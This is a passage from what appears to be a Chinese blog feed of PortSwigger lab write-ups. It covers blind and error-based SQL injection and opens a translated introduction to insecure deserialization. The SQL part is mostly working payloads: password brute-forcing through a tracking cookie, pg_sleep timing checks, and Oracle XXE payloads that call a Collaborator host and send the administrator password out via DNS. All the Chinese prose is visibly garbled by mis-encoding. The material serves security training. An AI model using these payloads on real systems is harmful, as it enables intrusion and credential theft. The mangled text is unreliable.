class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">6ã€çˆ†ç ´å¯†ç é•¿åº¦</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> LENGTH(password)<span class="operator">&gt;</span>Â§aÂ§ <span class="keyword">THEN</span> to_char(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">7ã€çˆ†ç ´å¯†ç </span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> SUBSTR(password,Â§bÂ§,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;Â§aÂ§&#x27;</span> <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="/posts/3b7c6011//image-20250316173050195.png" alt="image-20250316173050195"></p>
<h2 id="åŸºäºå¯è§é”™è¯¯çš„-SQL-æ³¨å…¥-boolå‹SQLæ³¨å…¥">åŸºäºå¯è§é”™è¯¯çš„ SQL æ³¨å…¥(boolå‹SQLæ³¨å…¥)</h2>
<p>é”™è¯¯ä¼šè¿”å›åˆ°å®¢æˆ·ç«¯</p>
<p><img src="/posts/3b7c6011//image-20250316181656140.png" alt="image-20250316181656140"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>ã€å¤©åŠ ä¸€ä¸ªå¼•å·ï¼Œå¯ä»¥åœ¨webé¡µé¢çœ‹åˆ°æŠ¥é”™ï¼Œå¹¶çœ‹åˆ°è‡ªå·±çš„cookie</span><br><span class="line">TrackingId<span class="operator">=</span>xxx<span class="string">&#x27;</span></span><br><span class="line"><span class="string">2ã€æ·»åŠ æ³¨é‡Šç¬¦ä¸å†æŠ¥é”™</span></span><br><span class="line"><span class="string">TrackingId=xxx&#x27;</span><span class="comment">--</span></span><br><span class="line"><span class="number">3</span>ã€æ·»åŠ é”™è¯¯çš„è¯­å¥è§‚å¯Ÿè¿”å›å†…å®¹</span><br><span class="line">TrackingId<span class="operator">=</span>xxx<span class="string">&#x27; AND CAST((SELECT 1) AS int)--</span></span><br><span class="line"><span class="string">4ã€ä½¿ç”¨æ­£ç¡®è¯­å¥é”™è¯¯æ¶ˆå¤±</span></span><br><span class="line"><span class="string">TrackingId=xxx&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br><span class="line"><span class="number">5</span>ã€æ³„éœ²ç”¨æˆ·</span><br><span class="line">TrackingId<span class="operator">=</span>xxxx<span class="string">&#x27; AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</span></span><br><span class="line"><span class="string">6ã€æ³„éœ²å¯†ç </span></span><br><span class="line"><span class="string">TrackingId=&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘è¯•äº†ä¸‹é¢è¿™ä¸ªæ³¨å…¥è¯­å¥ï¼Œä½†æ˜¯æ²¡æœ‰å¾—åˆ°æƒ³è¦çš„ç»“æœã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="string">&#x27; AND 1=CAST((SELECT password FROM users where username=&#x27;</span>administrator<span class="string">&#x27;) AS int)--</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/3b7c6011//image-20250316184013533.png" alt="image-20250316184013533"></p>
<h2 id="å¸¦æœ‰æ—¶é—´å»¶è¿Ÿå’Œä¿¡æ¯æ£€ç´¢çš„ç›²-SQL-æ³¨å…¥">å¸¦æœ‰æ—¶é—´å»¶è¿Ÿå’Œä¿¡æ¯æ£€ç´¢çš„ç›² SQL æ³¨å…¥</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>å»¶è¿Ÿ<span class="number">10</span>ç§’</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</span></span><br><span class="line"><span class="string">2.ä¸å»¶æ—¶</span></span><br><span class="line"><span class="string">TrackingId=x&#x27;</span><span class="operator">%</span><span class="number">3</span>BSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">10</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="comment">--</span></span><br><span class="line"><span class="number">3.</span>å»¶æ—¶ï¼Œè¯´æ˜æœ‰administratorç”¨æˆ·</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;</span>administrator<span class="string">&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br><span class="line"><span class="string">4.å»¶æ—¶ï¼Œè¯´æ˜å¯†ç é•¿åº¦ä¸º20</span></span><br><span class="line"><span class="string">TrackingId=x&#x27;</span><span class="operator">%</span><span class="number">3</span>BSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span><span class="operator">+</span><span class="keyword">AND</span><span class="operator">+</span>LENGTH(password)<span class="operator">=</span><span class="number">20</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">10</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>users<span class="comment">--</span></span><br><span class="line"><span class="number">5.</span>bpçˆ†ç ´</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;</span>administrator<span class="string">&#x27;+AND+SUBSTRING(password,Â§bÂ§,1)=&#x27;</span>Â§aÂ§<span class="string">&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br></pre></td></tr></table></figure>
<h2 id="å¸¦å¤–äº¤äº’çš„ç›²-SQL-æ³¨å…¥">å¸¦å¤–äº¤äº’çš„ç›² SQL æ³¨å…¥</h2>
<p><img src="/posts/3b7c6011//image-20250320124609391.png" alt="image-20250320124609391"></p>
<p><a href="http://k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com">k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie: TrackingId<span class="operator">=</span>Mf3GZbtHdrUPYCyR<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--; session=7HQmzle2kv8m9yAyiZADwZ8B64e6hGQp</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/3b7c6011//image-20250320124746996.png" alt="image-20250320124746996"></p>
<h2 id="SQLç›²æ³¨ä¸å¸¦å¤–æ•°æ®æ¸—å‡º">SQLç›²æ³¨ä¸å¸¦å¤–æ•°æ®æ¸—å‡º</h2>
<p>è·Ÿä¸Šè¾¹ç±»ä¼¼çš„</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.BURP-COLLABORATOR-SUBDOMAIN/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/3b7c6011//image-20250320142450030.png" alt="image-20250320142450030"></p>
<h2 id="é€šè¿‡-XML-ç¼–ç ç»•è¿‡è¿‡æ»¤å™¨çš„-SQL-æ³¨å…¥XMLç»•è¿‡æ³¨å…¥">é€šè¿‡ XML ç¼–ç ç»•è¿‡è¿‡æ»¤å™¨çš„ SQL æ³¨å…¥XMLç»•è¿‡æ³¨å…¥</h2>
<p><img src="/posts/3b7c6011//image-20250320153828228.png" alt="image-20250320153828228"></p>
<p><img src="/posts/3b7c6011//image-20250320153954704.png" alt="image-20250320153954704"></p>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>é¶åœºç»ƒä¹ </category>
      </categories>
      <tags>
        <tag>PortSwiggeré¶åœº</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€PortSwiggeré¶åœºã€‘ååºåˆ—åŒ–</title>
    <url>/posts/bea7d250/</url>
    <content><![CDATA[<h2 id="ä¸å®‰å…¨çš„ååºåˆ—åŒ–">ä¸å®‰å…¨çš„ååºåˆ—åŒ–</h2>
<p>åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»ä»€ä¹ˆæ˜¯ä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œå¹¶æè¿°ä¸å®‰å…¨çš„ååºåˆ—åŒ–å¦‚ä½•å¯èƒ½ä½¿ç½‘ç«™é­å—ä¸¥é‡æ”»å‡»ã€‚æˆ‘ä»¬å°†é‡ç‚¹ä»‹ç»å…¸å‹åœºæ™¯ï¼Œå¹¶ä½¿ç”¨ PHPã€Ruby å’Œ Java ååºåˆ—åŒ–çš„å…·ä½“ç¤ºä¾‹æ¼”ç¤ºä¸€äº›å¹¿æ³›é€‚ç”¨çš„æŠ€æœ¯ã€‚æˆ‘ä»¬è¿˜å°†ä»‹ç»ä¸€äº›å¯ä»¥é¿å…è‡ªå·±çš„ç½‘ç«™å‡ºç°ä¸å®‰å…¨ååºåˆ—åŒ–æ¼æ´çš„æ–¹æ³•ã€‚</p>
<h2 id="ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ï¼Ÿ">ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ï¼Ÿ</h2>
<p>åºåˆ—åŒ–æ˜¯å°†å¤æ‚çš„æ•°æ®ç»“æ„ï¼ˆå¦‚å¯¹è±¡åŠå…¶å­—æ®µï¼‰è½¬æ¢ä¸º â€œflatterâ€ æ ¼å¼çš„è¿‡ç¨‹ï¼Œè¿™ç§æ ¼å¼å¯ä»¥ä½œä¸ºè¿ç»­çš„å­—èŠ‚æµå‘é€å’Œæ¥æ”¶ã€‚æ•°æ®åºåˆ—åŒ–ä½¿ä»¥ä¸‹å·¥ä½œå˜å¾—æ›´åŠ ç®€å•ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>å°†å¤æ‚æ•°æ®å†™å…¥è¿›ç¨‹é—´å†…å­˜ã€æ–‡ä»¶æˆ–æ•°æ®åº“</p>
</li>
<li class="lvl-2">
<p>é€šè¿‡ç½‘ç»œã€åº”ç”¨ç¨‹åºä¸åŒç»„ä»¶ä¹‹é—´æˆ– API è°ƒç”¨ç­‰æ–¹å¼å‘é€å¤æ‚æ•°æ®</p>
</li>
</ul>
<p>æœ€é‡è¦çš„æ˜¯ï¼Œåœ¨åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œå…¶çŠ¶æ€ä¹Ÿä¼šè¢«æŒä¹…åŒ–ã€‚æ¢å¥è¯è¯´ï¼Œå¯¹è±¡çš„å±æ€§åŠå…¶èµ‹å€¼éƒ½ä¼šè¢«ä¿ç•™ä¸‹æ¥ã€‚</p>
<h3 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–">åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h3>
<p>ååºåˆ—åŒ–æ˜¯å°†å­—èŠ‚æµè¿˜åŸä¸ºåŸå§‹å¯¹è±¡çš„å…¨åŠŸèƒ½å¤åˆ¶å“çš„è¿‡ç¨‹ï¼Œå…¶çŠ¶æ€ä¸åºåˆ—åŒ–æ—¶å®Œå…¨ç›¸åŒã€‚ç„¶åï¼Œç½‘ç«™çš„é€»è¾‘å°±å¯ä»¥ä¸è¿™ä¸ªååºåˆ—åŒ–å¯¹è±¡äº¤äº’ï¼Œå°±åƒä¸å…¶ä»–å¯¹è±¡äº¤äº’ä¸€æ ·ã€‚</p>
<p>è®¸å¤šç¼–ç¨‹è¯­è¨€éƒ½ä¸ºåºåˆ—åŒ–æä¾›æœ¬åœ°æ”¯æŒã€‚å…·ä½“å¦‚ä½•åºåˆ—åŒ–å¯¹è±¡å–å†³äºè¯­è¨€ã€‚æœ‰äº›è¯­è¨€å°†å¯¹è±¡åºåˆ—åŒ–ä¸ºäºŒè¿›åˆ¶æ ¼å¼ï¼Œè€Œå…¶ä»–è¯­è¨€åˆ™ä½¿ç”¨ä¸åŒçš„å­—ç¬¦ä¸²æ ¼å¼ï¼Œå…¶å¯è¯»æ€§ä¹Ÿå„ä¸ç›¸åŒã€‚è¯·æ³¨æ„ï¼ŒåŸå§‹å¯¹è±¡çš„æ‰€æœ‰å±æ€§éƒ½ä¼šå­˜å‚¨åœ¨åºåˆ—åŒ–æ•°æ®æµä¸­ï¼ŒåŒ…æ‹¬ä»»ä½•ç§æœ‰å­—æ®µã€‚è¦é˜²æ­¢æŸä¸ªå­—æ®µè¢«åºåˆ—åŒ–ï¼Œå¿…é¡»åœ¨ç±»å£°æ˜ä¸­å°†å…¶æ˜ç¡®æ ‡è®°ä¸º â€œtransientâ€ å­—æ®µã€‚</p>
<p>è¯·æ³¨æ„ï¼Œåœ¨ä½¿ç”¨ä¸åŒçš„ç¼–ç¨‹è¯­è¨€æ—¶ï¼Œåºåˆ—åŒ–å¯èƒ½è¢«ç§°ä¸º marshallingï¼ˆRubyï¼‰æˆ– picklingï¼ˆPythonï¼‰ã€‚è¿™äº›æœ¯è¯­åœ¨æ­¤å¤„ä¸ â€œserializationâ€ åŒä¹‰ã€‚</p>
<h2 id="ä»€ä¹ˆæ˜¯ä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Ÿ">ä»€ä¹ˆæ˜¯ä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Ÿ</h2>
<p>ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ˜¯æŒ‡ç½‘ç«™å¯¹ç”¨æˆ·å¯æ§æ•°æ®è¿›è¡Œååºåˆ—åŒ–ã€‚è¿™æœ‰å¯èƒ½ä½¿æ”»å‡»è€…æ“çºµåºåˆ—åŒ–å¯¹è±¡ï¼Œä»è€Œå°†æœ‰å®³æ•°æ®ä¼ é€’åˆ°åº”ç”¨ç¨‹åºä»£ç ä¸­ã€‚</p>
<p>ç”šè‡³æœ‰å¯èƒ½å°†åºåˆ—åŒ–åçš„å¯¹è±¡æ›¿æ¢ä¸ºå®Œå…¨ä¸åŒç±»çš„å¯¹è±¡ã€‚ä»¤äººæ‹…å¿§çš„æ˜¯ï¼Œç½‘ç«™å¯ç”¨çš„ä»»ä½•ç±»çš„å¯¹è±¡éƒ½ä¼šè¢«ååºåˆ—åŒ–å’Œå®ä¾‹åŒ–ï¼Œè€Œä¸ç®¡é¢„æœŸçš„æ˜¯å“ªä¸ªç±»ã€‚å› æ­¤ï¼Œä¸å®‰å…¨çš„ååºåˆ—åŒ–æœ‰æ—¶è¢«ç§°ä¸º â€œå¯¹è±¡æ³¨å…¥ â€æ¼æ´ã€‚</p>
<p>ä¸€ä¸ªæ„å¤–ç±»çš„å¯¹è±¡å¯èƒ½ä¼šå¯¼è‡´å¼‚å¸¸ã€‚ä¸è¿‡ï¼Œæ­¤æ—¶ç ´åå¯èƒ½å·²ç»é€ æˆã€‚è®¸å¤šåŸºäºååºåˆ—åŒ–çš„æ”»å‡»éƒ½æ˜¯åœ¨ååºåˆ—åŒ–å®Œæˆä¹‹å‰å®Œæˆçš„ã€‚è¿™æ„å‘³ç€ï¼Œå³ä½¿ç½‘ç«™æœ¬èº«çš„åŠŸèƒ½ä¸ç›´æ¥ä¸æ¶æ„å¯¹è±¡äº¤äº’ï¼Œååºåˆ—åŒ–è¿‡ç¨‹æœ¬èº«ä¹Ÿå¯èƒ½å‘èµ·æ”»å‡»ã€‚å› æ­¤ï¼Œé€»è¾‘åŸºäºå¼ºç±»å‹è¯­è¨€çš„ç½‘ç«™ä¹Ÿå®¹æ˜“å—åˆ°è¿™äº›æŠ€æœ¯çš„æ”»å‡»ã€‚</p>
<h2 id="ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿ">ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿ</h2>
<p>ä¸å®‰å…¨çš„ååºåˆ—åŒ–é€šå¸¸æ˜¯å› ä¸ºäººä»¬æ™®éç¼ºä¹å¯¹ååºåˆ—åŒ–ç”¨æˆ·å¯æ§æ•°æ®çš„å±é™©æ€§çš„è®¤è¯†ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œç”¨æˆ·è¾“å…¥æ ¹æœ¬ä¸åº”è¯¥è¢«ååºåˆ—åŒ–ã€‚</p>
<p>ä¸è¿‡ï¼Œæœ‰æ—¶ç½‘ç«™æ‰€æœ‰è€…ä¼šè®¤ä¸ºè‡ªå·±å¾ˆå®‰å…¨ï¼Œå› ä¸ºä»–ä»¬å¯¹ååºåˆ—åŒ–æ•°æ®å®æ–½äº†æŸç§å½¢å¼çš„é¢å¤–æ£€æŸ¥ã€‚è¿™ç§æ–¹æ³•å¾€å¾€æ˜¯æ— æ•ˆçš„ï¼Œå› ä¸ºå‡ ä¹ä¸å¯èƒ½å®æ–½éªŒè¯æˆ–æ¶ˆæ¯’æ¥åº”å¯¹æ¯ä¸€ç§å¯èƒ½å‘ç”Ÿçš„æƒ…å†µã€‚è¿™äº›æ£€æŸ¥ä»æ ¹æœ¬ä¸Šè¯´ä¹Ÿæ˜¯æœ‰ç¼ºé™·çš„ï¼Œå› ä¸ºå®ƒä»¬ä¾èµ–äºåœ¨æ•°æ®è¢«ååºåˆ—åŒ–åå¯¹å…¶è¿›è¡Œæ£€æŸ¥ï¼Œè€Œåœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œè¿™å·²ç»å¤ªæ™šäº†ï¼Œæ— æ³•é˜»æ­¢æ”»å‡»ã€‚</p>
<p>ç”±äºé€šå¸¸è®¤ä¸ºååºåˆ—åŒ–å¯¹è±¡æ˜¯å¯ä¿¡çš„ï¼Œå› æ­¤ä¹Ÿå¯èƒ½å‡ºç°æ¼æ´ã€‚ç‰¹åˆ«æ˜¯åœ¨ä½¿ç”¨äºŒè¿›åˆ¶åºåˆ—åŒ–æ ¼å¼çš„è¯­è¨€æ—¶ï¼Œå¼€å‘äººå‘˜å¯èƒ½ä¼šè®¤ä¸ºç”¨æˆ·æ— æ³•æœ‰æ•ˆåœ°è¯»å–æˆ–æ“ä½œæ•°æ®ã€‚ç„¶è€Œï¼Œè™½ç„¶å¯èƒ½éœ€è¦ä»˜å‡ºæ›´å¤šåŠªåŠ›ï¼Œä½†æ”»å‡»è€…åˆ©ç”¨äºŒè¿›åˆ¶åºåˆ—åŒ–å¯¹è±¡çš„å¯èƒ½æ€§ä¸åˆ©ç”¨åŸºäºå­—ç¬¦ä¸²æ ¼å¼çš„å¯¹è±¡çš„å¯èƒ½æ€§ä¸€æ ·å¤§ã€‚</p>
<p>ç°ä»£ç½‘ç«™ä¸­å­˜åœ¨å¤§é‡ä¾èµ–å…³ç³»ï¼Œè¿™ä¹Ÿä½¿å¾—åŸºäºååºåˆ—åŒ–çš„æ”»å‡»æˆä¸ºå¯èƒ½ã€‚ä¸€ä¸ªå…¸å‹çš„ç½‘ç«™å¯èƒ½å®ç°äº†è®¸å¤šä¸åŒçš„åº“ï¼Œæ¯ä¸ªåº“éƒ½æœ‰è‡ªå·±çš„ä¾èµ–å…³ç³»ã€‚è¿™å°±å½¢æˆäº†ä¸€ä¸ªåºå¤§çš„ç±»å’Œæ–¹æ³•æ± ï¼Œå¾ˆéš¾å¯¹å…¶è¿›è¡Œå®‰å…¨ç®¡ç†ã€‚ç”±äºæ”»å‡»è€…å¯ä»¥åˆ›å»ºä»»ä½•è¿™äº›ç±»çš„å®ä¾‹ï¼Œå› æ­¤å¾ˆéš¾é¢„æµ‹åœ¨æ¶æ„æ•°æ®ä¸Šå¯ä»¥è°ƒç”¨å“ªäº›æ–¹æ³•ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿå°†ä¸€é•¿ä¸²æ„æƒ³ä¸åˆ°çš„æ–¹æ³•è°ƒç”¨ä¸²è”èµ·æ¥ï¼Œå°†æ•°æ®ä¼ é€’åˆ°ä¸åˆå§‹æºå®Œå…¨æ— å…³çš„æ±‡ä¸­ï¼Œæƒ…å†µå°±æ›´æ˜¯å¦‚æ­¤ã€‚å› æ­¤ï¼Œè¦é¢„æµ‹æ¶æ„æ•°æ®æµå¹¶å µä½æ¯ä¸ªæ½œåœ¨æ¼æ´å‡ ä¹æ˜¯ä¸å¯èƒ½çš„ã€‚</p>
<p>ç®€è€Œè¨€ä¹‹ï¼Œå¯ä»¥è¯´ä¸å¯èƒ½å®‰å…¨åœ°ååºåˆ—åŒ–ä¸å—ä¿¡ä»»çš„è¾“å…¥ã€‚</p>
<h2 id="ä¸å®‰å…¨çš„ååºåˆ—åŒ–ä¼šäº§ç”Ÿä»€ä¹ˆå½±å“ï¼Ÿ">ä¸å®‰å…¨çš„ååºåˆ—åŒ–ä¼šäº§ç”Ÿä»€ä¹ˆå½±å“ï¼Ÿ</h2>
<p>ä¸å®‰å…¨çš„ååºåˆ—åŒ–å¯èƒ½ä¼šé€ æˆéå¸¸ä¸¥é‡çš„å½±å“ï¼Œå› ä¸ºå®ƒä¸ºå¤§é‡å¢åŠ çš„æ”»å‡»é¢æä¾›äº†ä¸€ä¸ªåˆ‡å…¥ç‚¹ã€‚å®ƒå…è®¸æ”»å‡»è€…ä»¥æœ‰å®³çš„æ–¹å¼é‡å¤ä½¿ç”¨ç°æœ‰çš„åº”ç”¨ç¨‹åºä»£ç ï¼Œå¯¼è‡´è®¸å¤šå…¶ä»–æ¼æ´ï¼Œé€šå¸¸æ˜¯è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>
<p>å³ä½¿åœ¨ä¸å¯èƒ½æ‰§è¡Œè¿œç¨‹ä»£ç çš„æƒ…å†µä¸‹ï¼Œä¸å®‰å…¨çš„ååºåˆ—åŒ–ä¹Ÿä¼šå¯¼è‡´æƒé™å‡çº§ã€ä»»æ„æ–‡ä»¶è®¿é—®å’Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p>
<h2 id="å¦‚ä½•åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´">å¦‚ä½•åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´</h2>
<p>ç°åœ¨æ‚¨å·²ç»ç†Ÿæ‚‰äº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„åŸºç¡€çŸ¥è¯†ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹å¦‚ä½•åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ã€‚</p>
<h2 id="åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´">åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´</h2>
<p>åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ä»¥ PHPã€Ruby å’Œ Java ååºåˆ—åŒ–ä¸ºä¾‹ï¼Œæ•™æ‚¨å¦‚ä½•åˆ©ç”¨ä¸€äº›å¸¸è§æƒ…å†µã€‚æˆ‘ä»¬å¸Œæœ›å±•ç¤ºåˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–å®é™…ä¸Šæ¯”è®¸å¤šäººæƒ³è±¡çš„è¦å®¹æ˜“å¾—å¤šã€‚å¦‚æœæ‚¨èƒ½å¤Ÿä½¿ç”¨é¢„æ„å»ºçš„å°å·¥å…·é“¾ï¼Œç”šè‡³åœ¨é»‘ç›’æµ‹è¯•ä¸­å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ã€‚</p>
<p>æˆ‘ä»¬è¿˜å°†æŒ‡å¯¼æ‚¨åˆ›å»ºè‡ªå·±çš„åŸºäºååºåˆ—åŒ–çš„é«˜ä¸¥é‡æ€§æ”»å‡»ã€‚è™½ç„¶è¿™äº›æ”»å‡»é€šå¸¸éœ€è¦æºä»£ç è®¿é—®æƒé™ï¼Œä½†ä¸€æ—¦ç†è§£äº†åŸºæœ¬æ¦‚å¿µï¼Œå­¦ä¹ èµ·æ¥ä¹Ÿä¼šæ¯”æƒ³è±¡ä¸­å®¹æ˜“ã€‚æˆ‘ä»¬å°†ç‰¹åˆ«ä»‹ç»ä»¥ä¸‹ä¸»é¢˜ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>å¦‚ä½•è¯†åˆ«ä¸å®‰å…¨çš„ååºåˆ—åŒ– LABS</p>
</li>
<li class="lvl-2">
<p>ä¿®æ”¹ç½‘ç«™æœŸæœ›çš„åºåˆ—åŒ–å¯¹è±¡ LABS</p>
</li>
<li class="lvl-2">
<p>å‘å±é™©çš„ç½‘ç«™åŠŸèƒ½ä¼ é€’æ¶æ„æ•°æ® LABS</p>
</li>
<li class="lvl-2">
<p>æ³¨å…¥ä»»æ„å¯¹è±¡ç±»å‹</p>
</li>
<li class="lvl-2">
<p>ä¸²è”æ–¹æ³•è°ƒç”¨ä»¥æ§åˆ¶è¿›å…¥å±é™©æ°´æ§½å°å·¥å…·çš„æ•°æ®æµ LABS</p>
</li>
<li class="lvl-2">
<p>æ‰‹åŠ¨åˆ›å»ºè‡ªå·±çš„é«˜çº§æ¼æ´åˆ©ç”¨ç¨‹åº LABS</p>
</li>
<li class="lvl-2">
<p>PHAR ååºåˆ—åŒ–</p>
</li>
</ul>
<blockquote>
<p><strong>Note</strong></p>
